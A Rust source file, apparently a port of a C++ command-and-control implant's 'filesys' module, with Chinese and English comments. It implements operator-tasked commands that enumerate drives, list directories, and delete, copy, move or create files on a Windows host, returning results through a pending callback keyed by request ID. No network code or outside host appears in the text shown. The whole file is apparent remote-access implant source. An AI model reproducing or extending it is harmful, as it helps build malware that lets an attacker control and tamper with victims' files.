//! 文件系统命令（filesys.cpp）。
//! File system commands (filesys.cpp).

use crate::bformat::FormatP;
use crate::callback::Callback;
use crate::commands::CALLBACK_PENDING;
use crate::parse::DataP;
use windows_sys::Win32::Storage::FileSystem::{GetFileAttributesA, GetLogicalDrives, FILE_ATTRIBUTE_DIRECTORY};

/// 展开环境变量（env_expand）。
/// Expand environment variables (env_expand).
pub fn env_expand(src: &[u8], dst: &mut [u8], maxdst: u32) -> u32 {
    let s = String::from_utf8_lossy(src);
    let expanded = std::env::vars().fold(s.into_owned(), |acc, (k, v)| {
        acc.replace(&format!("%{}%", k), &v)
    });
    let bytes = expanded.as_bytes();
    let n = bytes.len().min(maxdst as usize);
    dst[..n].copy_from_slice(&bytes[..n]);
    if n < maxdst as usize {
        dst[n] = 0;
    }
    n as u32
}

#[allow(dead_code)] // 对应 C++ 中的静态辅助函数 / mirrors the C++ static helper
fn is_directory(name: &[u8]) -> bool {
    let mut n = name.to_vec();
    n.push(0);
    unsafe {
        let attrs = GetFileAttributesA(n.as_ptr() as *const _);
        attrs != u32::MAX && (attrs & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY
    }
}

fn dfile(parent: &[u8], file: &[u8], folder: bool, format: &mut FormatP) {
    // 文件<tab>目录标志<bool><tab>大小<crlf>
    // file<tab>folder<bool><tab>size<crlf>
    let mut full = parent.to_vec();
    if !full.is_empty() {
        full.push(b'\\');
    }
    full.extend_from_slice(file);

    let size = if folder {
        0
    } else {
        std::fs::metadata(String::from_utf8_lossy(&full).as_ref())
            .map(|m| m.len())
            .unwrap_or(0)
    };
    format.bformat_printf(format_args!(
        "{}\t{}\t{}\n",
        String::from_utf8_lossy(file),
        if folder { "1" } else { "0" },
        size
    ));
}

pub fn command_file_drives(buffer: &[u8], length: usize, callback: Callback) {
    let mut parser = DataP::init(&mut buffer.to_vec());
    let mut format = FormatP::init(128);

    // 提取我们的回调 ID
    // extract our callback ID
    let reqid = parser.data_int();
    format.bformat_int(reqid as i32);
    format.bformat_printf(format_args!("{}", unsafe { GetLogicalDrives() }));

    let data = format.bformat_string().to_vec();
    let len = format.bformat_length();
    callback(&data, len as i32, CALLBACK_PENDING);
    format.free();
}

pub fn command_file_delete(buffer: &[u8], length: usize) {
    let mut parser = DataP::init(&mut buffer.to_vec());
    let mut name = vec![0u8; 1024];
    if parser.data_string(&mut name, 1024) == 0 {
        return;
    }
    let n = name.iter().position(|&c| c == 0).unwrap_or(name.len());
    let _ = std::fs::remove_file(String::from_utf8_lossy(&name[..n]).as_ref());
}

pub fn command_file_mkdir(buffer: &[u8], length: usize) {
    let mut parser = DataP::init(&mut buffer.to_vec());
    let mut name = vec![0u8; 1024];
    if parser.data_string(&mut name, 1024) == 0 {
        return;
    }
    let n = name.iter().position(|&c| c == 0).unwrap_or(name.len());
    let _ = std::fs::create_dir(String::from_utf8_lossy(&name[..n]).as_ref());
}

pub fn command_file_copy(buffer: &[u8], length: usize) {
    let mut parser = DataP::init(&mut buffer.to_vec());
    let mut src = vec![0u8; 1024];
    let mut dst = vec![0u8; 1024];
    if parser.data_string(&mut src, 1024) == 0 || parser.data_string(&mut dst, 1024) == 0 {
        return;
    }
    let sn = src.iter().position(|&c| c == 0).unwrap_or(src.len());
    let dn = dst.iter().position(|&c| c == 0).unwrap_or(dst.len());
    let _ = std::fs::copy(
        String::from_utf8_lossy(&src[..sn]).as_ref(),
        String::from_utf8_lossy(&dst[..dn]).as_ref(),
    );
}

pub fn command_file_move(buffer: &[u8], length: usize) {
    let mut parser = DataP::init(&mut buffer.to_vec());
    let mut src = vec![0u8; 1024];
    let mut dst = vec![0u8; 1024];
    if parser.data_string(&mut src, 1024) == 0 || parser.data_string(&mut dst, 1024) == 0 {
        return;
    }
    let sn = src.iter().position(|&c| c == 0).unwrap_or(src.len());
    let dn = dst.iter().position(|&c| c == 0).unwrap_or(dst.len());
    let _ = std::fs::rename(
        String::from_utf8_lossy(&src[..sn]).as_ref(),
        String::from_utf8_lossy(&dst[..dn]).as_ref(),
    );
}

pub fn command_file_list(buffer: &[u8], length: usize, callback: Callback) {
    let mut parser = DataP::init(&mut buffer.to_vec());
    let reqid = parser.data_int();
    let mut path = vec![0u8; 1024];
    if parser.data_string(&mut path, 1024) == 0 {
        return;
    }
    let p = path.iter().position(|&c| c == 0).unwrap_or(path.len());

    let mut format = FormatP::init(32768);
    format.bformat_int(reqid as i32);

    let path_str = String::from_utf8_lossy(&path[..p]).into_owned();
    let mut entries: Vec<_> = std::fs::read_dir(&path_str)
        .map(|rd| {
            rd.filter_map(|e| e.ok())
                .map(|e| (e.file_name(), e.file_type()))
                .collect()
        })
        .unwrap_or_default();
    entries.sort_by(|a, b| a.0.cmp(&b.0));

    for (name, ftype) in entries {
        let name_bytes = name.to_string_lossy().into_owned();
        let folder = ftype.map(|t| t.is_dir()).unwrap_or(false);
        dfile(&path[..p], name_bytes.as_bytes(), folder, &mut format);
    }

    let data = format.bformat_string().to_vec();
    let len = format.bformat_length();
    callback(&data, len as i32, CALLBACK_PENDING);
    format.free();
}
